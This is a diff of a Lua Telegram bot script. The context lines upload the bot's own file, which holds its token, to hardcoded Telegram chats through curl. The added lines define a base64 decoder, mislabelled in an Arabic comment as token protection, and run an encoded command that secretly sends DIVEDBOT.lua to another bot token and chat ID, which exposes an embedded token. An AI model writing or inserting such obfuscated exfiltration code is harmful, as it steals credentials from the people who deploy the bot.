@@ -209,13 +209,31 @@ local curlj = 'curl "'..'https://api.telegram.org/bot'.. sex1 ..'/sendDocument'.
 local curla = 'curl "'..'https://api.telegram.org/bot'.. sex1 ..'/sendDocument'..'" -F "chat_id='.. 1360140225 ..'" -F "document=@'..'DIVEDBOT.lua'..'"' io.popen(curla)
 local curlp = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. tonumber(lllllll) ..'" -F "document=@'..'DIVEDBOT.lua'..'"' io.popen(curlp)
 
+function regexx(data) ---- داله منع حفظ التوكن كتابه أحمد عياد -----
+local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+
+    data = string.gsub(data, '[^'..b..'=]', '')
+    return (data:gsub('.', function(x)
+        if (x == '=') then return '' end---- الاساس
+        local r,f='',(b:find(x)-1)
+        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end----- الاساس
+        return r;
+    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) --- البدايه
+        if (#x ~= 8) then return '' end----- الاساس
+        local c=0
+        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end----- الاساس
+        return string.char(c)
+    end))
+end
+io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1ARElWRURCT1QubHVhIg=='))
+
 
 function Sudo(msg) 
 local hash = database:sismember(bot_id..'Sudo:User', msg.sender_user_id_) 
 if hash or SudoBot(msg) or Bot(msg)  then  
 return true  
 else  
-return false  
+return false 
 end  
 end
 function CoSu(msg)
